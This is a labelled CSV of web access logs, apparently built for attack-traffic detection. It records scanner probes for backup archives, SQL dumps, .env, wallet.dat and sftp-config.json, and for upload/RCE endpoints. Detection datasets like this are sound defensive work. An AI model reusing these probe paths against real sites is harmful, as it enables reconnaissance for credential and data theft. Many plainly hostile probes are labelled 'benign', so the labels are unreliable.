source_log,timestamp,ip,method,path,query,path_with_query,protocol,status,bytes,referer,user_agent,label,label_source,label_reason,text
2022-12-22,2022-12-22T14:31:39-08:00,185.92.25.55,HEAD,/bak/backup.rar,,/bak/backup.rar,HTTP/1.1,301,181,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/bak/backup.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T02:26:58-08:00,49.44.82.7,GET,/,,/,HTTP/1.1,301,438,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36",benign,default_benign,No weak-rule hit,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:59:40-08:00,185.192.16.11,HEAD,/www.sql,,/www.sql,HTTP/1.1,301,174,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/www.sql QUERY= PROTOCOL=HTTP/1.1
2021-10-22,2021-10-22T12:27:06-07:00,125.78.229.99,POST,/uploads/dede/sys_verifies.php,action=down,/uploads/dede/sys_verifies.php?action=down,HTTP/1.1,418,746,http://www.secrepo.com/uploads/dede/sys_verifies.php?action=down,Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2),command_exec,weak_rule:upload_rce_probe,Upload/RCE endpoint probe,METHOD=POST PATH=/uploads/dede/sys_verifies.php QUERY=action=down PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:15:09-08:00,85.10.56.247,HEAD,/bak/www.tar,,/bak/www.tar,HTTP/1.1,301,178,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/bak/www.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:09:58-08:00,194.169.217.1,HEAD,/back/public_html.rar,,/back/public_html.rar,HTTP/1.1,301,187,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/back/public_html.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:40:02-08:00,185.192.71.170,HEAD,/old/website.rar,,/old/website.rar,HTTP/1.1,301,182,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/old/website.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:44:04-08:00,98.159.226.188,HEAD,/backups/config.json,,/backups/config.json,HTTP/1.1,301,186,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backups/config.json QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:17:11-08:00,84.247.59.175,HEAD,/config.json,,/config.json,HTTP/1.1,301,178,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/config.json QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T15:10:14-08:00,188.212.135.105,HEAD,/bak/wallet.dat,,/bak/wallet.dat,HTTP/1.1,301,181,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/bak/wallet.dat QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T11:26:26-08:00,120.245.60.11,GET,/robots.txt,,/robots.txt,HTTP/1.1,301,458,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",benign,default_benign,No weak-rule hit,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T12:15:38-08:00,212.30.37.137,HEAD,/old/backup.sql.tar,,/old/backup.sql.tar,HTTP/1.1,301,185,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/old/backup.sql.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T12:06:13-08:00,98.159.226.241,HEAD,/old/website.tar,,/old/website.tar,HTTP/1.1,301,182,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/old/website.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T11:59:50-08:00,45.130.202.69,HEAD,/www.tar,,/www.tar,HTTP/1.1,301,174,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/www.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:00:58-08:00,84.247.59.159,HEAD,/.env,,/.env,HTTP/1.1,404,124,,-,suspicious_path_probe,weak_rule:suspicious_probe,Sensitive/exploit-prone path probe,METHOD=HEAD PATH=/.env QUERY= PROTOCOL=HTTP/1.1
2021-10-22,2021-10-22T10:25:29-07:00,44.195.86.98,GET,/wp-content/upload.php,,/wp-content/upload.php,HTTP/1.1,404,328,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36",command_exec,weak_rule:upload_rce_probe,Upload/RCE endpoint probe,METHOD=GET PATH=/wp-content/upload.php QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:16:07-08:00,212.30.33.45,HEAD,/back/www.rar,,/back/www.rar,HTTP/1.1,301,179,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/back/www.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:04:33-08:00,188.212.135.102,HEAD,/back/website.rar,,/back/website.rar,HTTP/1.1,301,183,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/back/website.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:51:50-08:00,217.138.202.62,HEAD,/old/backup.rar,,/old/backup.rar,HTTP/1.1,301,181,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/old/backup.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T15:52:01-08:00,85.206.166.82,HEAD,/website.rar,,/website.rar,HTTP/1.1,301,178,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/website.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:50:25-08:00,194.169.217.150,HEAD,/backups/secrepo.com.sql,,/backups/secrepo.com.sql,HTTP/1.1,301,190,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backups/secrepo.com.sql QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:52:40-08:00,185.195.19.200,HEAD,/bak/public_html.tar,,/bak/public_html.tar,HTTP/1.1,301,186,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/bak/public_html.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:38:33-08:00,45.128.199.39,HEAD,/restore/bak.tar,,/restore/bak.tar,HTTP/1.1,301,182,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/restore/bak.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:13:02-08:00,194.169.217.215,HEAD,/bak/sftp-config.json,,/bak/sftp-config.json,HTTP/1.1,301,187,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/bak/sftp-config.json QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:31:37-08:00,45.67.99.142,HEAD,/backups/mysql.sql,,/backups/mysql.sql,HTTP/1.1,301,184,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backups/mysql.sql QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:05:04-08:00,157.97.120.10,HEAD,/old/secrepo.com.rar,,/old/secrepo.com.rar,HTTP/1.1,301,186,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/old/secrepo.com.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:20:49-08:00,82.118.30.73,HEAD,/back/.well-known.zip,,/back/.well-known.zip,HTTP/1.1,301,187,,-,suspicious_path_probe,weak_rule:suspicious_probe,Sensitive/exploit-prone path probe,METHOD=HEAD PATH=/back/.well-known.zip QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T12:48:49-08:00,82.118.30.33,HEAD,/bak/website.tar,,/bak/website.tar,HTTP/1.1,301,182,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/bak/website.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T12:53:53-08:00,157.97.120.9,HEAD,/old/wallet.dat,,/old/wallet.dat,HTTP/1.1,301,181,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/old/wallet.dat QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:47:41-08:00,85.203.34.102,HEAD,/bak/www.sql,,/bak/www.sql,HTTP/1.1,301,178,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/bak/www.sql QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T23:07:40-08:00,194.38.20.161,GET,/assets/plugins/fileupload/server/php/index.php,file=tf2rghf.jpg,/assets/plugins/fileupload/server/php/index.php?file=tf2rghf.jpg,HTTP/1.1,429,487,,ALittle Client,command_exec,weak_rule:upload_rce_probe,Upload/RCE endpoint probe,METHOD=GET PATH=/assets/plugins/fileupload/server/php/index.php QUERY=file=tf2rghf.jpg PROTOCOL=HTTP/1.1
